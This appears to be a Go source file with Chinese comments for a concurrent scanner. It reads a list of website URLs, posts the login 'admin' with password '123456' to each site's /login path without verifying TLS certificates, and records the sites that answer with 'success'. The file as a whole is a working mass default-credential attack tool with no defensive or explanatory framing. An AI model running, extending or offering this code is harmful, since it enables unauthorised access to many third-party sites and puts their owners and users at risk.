package main


import (
	"fmt"
	"time"
	"sync"
	"bufio"
	"os"
	"net"
	"regexp"
	"strings"
	"net/http"
	"crypto/tls"
	"io/ioutil"
	"github.com/gookit/color"
	"golang.org/x/text/transform"
	"golang.org/x/text/encoding"
	"golang.org/x/text/encoding/unicode"
	"golang.org/x/net/html/charset"
	pb "gopkg.in/cheggaaa/pb.v1"

)


var (
	ch 			chan bool
	wg          sync.WaitGroup
	bar         *pb.ProgressBar
	filename    string
	savename    string
	path        string
	threads     int
	timeout     int
	//titleRe = regexp.MustCompile(`>(.*?)\s?</title>`)


)


func init() {
	threads  = 30                        // 线程数量
	timeout  = 5                         // 超时
	path     = "/login"       // 请求路径
	filename = "urlhfish.txt"              // 读取路径
	savename = "save.txt"                // 存储结果路径
}


func main() {
	startTime := time.Now()
	ch = make(chan bool, threads)
	urllist , num, err := readLines(filename)
	if err != nil {
		fmt.Println("读取路径数据错误 ！" , err)
		os.Exit(0)
	}
	color.Green.Print("[+]")
	fmt.Println("  共扫描：",num)

	// 显示进度条
	bar = pb.New(len(urllist))
	bar.ShowSpeed = false
	bar.ShowTimeLeft = false
	bar.Start()


	for _, v := range urllist {
		urlpath := v + path
		ch <- true
		wg.Add(1)
		go requestworker(urlpath)
	}
	wg.Wait()

	finishMessage := fmt.Sprintf(" Time taken for tests: %v\n\n", time.Since(startTime))
	bar.FinishPrint(fmt.Sprintf(finishMessage))
}


func requestworker(url string) {
	defer func() {
		<-ch
		if bar != nil {
			bar.Increment()
		}
		wg.Done()
	}()

	var req *http.Request
	var err error

	req, err = http.NewRequest("POST", url, strings.NewReader("loginName=admin&loginPwd=123456"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		fmt.Println("请求错误 ！")
	}

	client := createHTTPClient()
	time.Sleep(1e9) 
	resp, err1 := client.Do(req)
	if err1 != nil {
		//color.Red.Print("[+]")
		//fmt.Println("  网站超时错误 ！",url,err1)
		return
	}

	defer resp.Body.Close()

	reader := bufio.NewReader(resp.Body)
	e := determineEncoding(reader)
	utf8Reader := transform.NewReader(reader, e.NewDecoder())
	bodyss, err := ioutil.ReadAll(utf8Reader)
	if err != nil {
		bodyss = []byte("")
	}

	respBody := string(bodyss)
	var validID = regexp.MustCompile(`success`)
	if validID.MatchString(respBody) {
		tracefile(url+"\n",savename)
	}
}


func tracefile(str_content,savename string)  {
    fd,_:=os.OpenFile(savename,os.O_RDWR|os.O_CREATE|os.O_APPEND,0644)
    fd_content:=str_content
    buf:=[]byte(fd_content)
    fd.Write(buf)
    fd.Close()
}


func determineEncoding(r *bufio.Reader) encoding.Encoding {
	b, err := r.Peek(1024)
	if err != nil {
		return unicode.UTF8
	}
	e, _, _ := charset.DetermineEncoding(b, "")
	return e
}


func createHTTPClient() *http.Client {
	// 不校验证书
	tr := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   time.Duration(timeout) * time.Second,
			Deadline:  time.Now().Add(time.Duration(timeout) * time.Second),
			KeepAlive: time.Duration(timeout) * time.Second,
		}).Dial,
		TLSHandshakeTimeout: time.Duration(timeout) * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}}

	// 主要是这里构造超时
	client := &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: tr,
	}
	return client
}


func readLines(path string) ([]string, int, error) {
  file, err := os.Open(path)
  if err != nil {
    return nil,0, err
  }
  defer file.Close()

  var lines []string
  linecount :=0
  scanner := bufio.NewScanner(file)
  for scanner.Scan() {
    lines = append(lines, scanner.Text())
    linecount++
  }
  return lines,linecount,scanner.Err()
}